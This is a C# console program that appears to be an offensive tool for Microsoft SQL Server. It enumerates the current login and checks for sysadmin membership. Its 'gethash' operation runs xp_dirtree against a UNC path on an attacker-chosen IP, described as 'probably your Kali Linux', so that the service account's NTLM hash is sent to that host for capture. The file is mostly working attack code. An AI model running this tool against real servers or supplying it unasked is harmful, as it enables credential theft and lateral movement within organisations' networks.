using System;
using System.Data.SqlClient;
using System.Runtime.Remoting.Messaging;

namespace SQL
{
    class Program
    {
        static void check_role(SqlConnection con, string roleName)
        {
            // Check if only public role
            String querypublicrole = $"SELECT IS_SRVROLEMEMBER('{roleName}');";
            SqlCommand command = new SqlCommand(querypublicrole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"User is a member of {roleName} role");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"User is NOT a member of {roleName} role");
                Console.ResetColor();
            }
            reader.Close();
        }
        static void enum_current_user(SqlConnection con)
        {
            // Check Who is logged in
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            check_role(con, "public");
            check_role(con, "sysadmin");
 
            con.Close();
        }

        static void get_svchash(SqlConnection con, string srvIP)
        {
            String query = $"EXEC master..xp_dirtree \"\\\\{srvIP}\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }



        static void DisplayUsage()
        {
            Console.WriteLine("Usage: YourProgramName <sqlServer> <dbName> <operation> <hashServer>");
            Console.WriteLine("Arguments:");
            Console.WriteLine("  <sqlServer>    SQL Server name (required)");
            Console.WriteLine("  <dbName>       Database name (required)");
            Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash'");
            Console.WriteLine("  <hashServer>   Server to send svc hash (probably your Kali Linux'");
        }


        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                DisplayUsage();
                return;
            }

            string sqlServer = args[0];
            string database = args[1];
            string operation = args[2];


            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            switch (operation.ToLower())
            {
                case "enum":
                    enum_current_user(con);
                    break;
                case "gethash":
                    if (args.Length < 4)
                    {
                        Console.WriteLine("Error: Missing argument. For 'gethash' operation, provide a IP address to send hash.");
                        DisplayUsage();
                        return;
                    }
                    get_svchash(con, args[3]);
                    break;

                default:
                    Console.WriteLine($"Error: Invalid operation '{operation}'. Supported: 'enum', 'gethash'");
                    DisplayUsage();
                    break;
            }





            con.Close();
        }
    }
}